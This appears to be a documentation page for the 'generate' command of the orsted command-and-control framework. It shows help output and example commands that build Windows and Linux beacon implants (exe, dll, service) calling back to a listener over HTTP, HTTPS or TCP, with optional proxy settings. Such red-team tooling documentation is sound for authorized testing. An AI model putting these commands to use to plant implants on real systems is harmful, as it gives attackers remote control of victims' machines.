---
title: generate
description: orsted c2 generate
---

### General

The `generate` command is only available from the main menu of the orsted client.

It allows to generate beacons.

```
orsted-client » generate --help

generate beacon or implant from a given beacon

Usage:
  generate [flags]

Flags:
  -h, --help     display help

Sub Commands:
  beacon  generate beacon (HTTP, HTTPS, TCP)
```

Listeners only support HTTP or HTTPS, TCP in the latest orsted version. Other protocol support may come soon.

### Generate a Windows beacon

Here the `tab` of the keyboard will guide you.

For example, to generate a `orsted-beacon` that:
- is a windows `exe`
- talk `http`
- connect to `192.168.122.45:80`

You can use

```bash
orsted-client » generate beacon windows http 192.168.122.45:80
```

`main_http.exe` will be generated.

For windows, you can generate a dll or a service for each protocol of communication type.

For example, to generate a `orsted-beacon` that:
- is a windows `service`
- talk `tcp`
- connect to `127.0.0.1:4444`

You can use

```bash
orsted-client » generate beacon windows tcp_svc 127.0.0.1:4444
```

`main_tcp_svc.exe` will be generated.


### Generate a Linux beacon

Here the `tab` of the keyboard will guide you.

For example, to generate a `orsted-beacon` that:
- is a Linux `elf`
- talk `http`
- connect to `192.168.122.45:80`

You can use

```bash
orsted-client » generate beacon linux http 192.168.122.45:80
```

`main_http` will be generated.


### Proxy Options

It is possible to add proxy when generating a Beacon. This work only for HTTP beacon.

```
orsted-client » generate beacon --help

generate beacon (HTTP, HTTPS, TCP or SMB _ windows only _

Usage:
  beacon [flags] os type address

Args:
  os       string    windows or linux
  type     string    http[                   dll svc] https[ dll svc] tcp[ dll svc] or smb[ dll svc]
  address  string    address for http or tcp

Flags:
  -h, --help                          display help
  -a, --http-proxy-address  string    URL for example 127.0.0.1:8080
  -p, --http-proxy-password string    Proxy Password
  -t, --http-proxy-type     string    HTTP Proxy Type, can be HTTP or HTTPS (default: none)
  -u, --http-proxy-username string    Proxy Username
```

For example

```
orsted-client » generate beacon --http-proxy-type http --http-proxy-address 192.168.122.45:8080 windows http 192.168.122.45:80
```
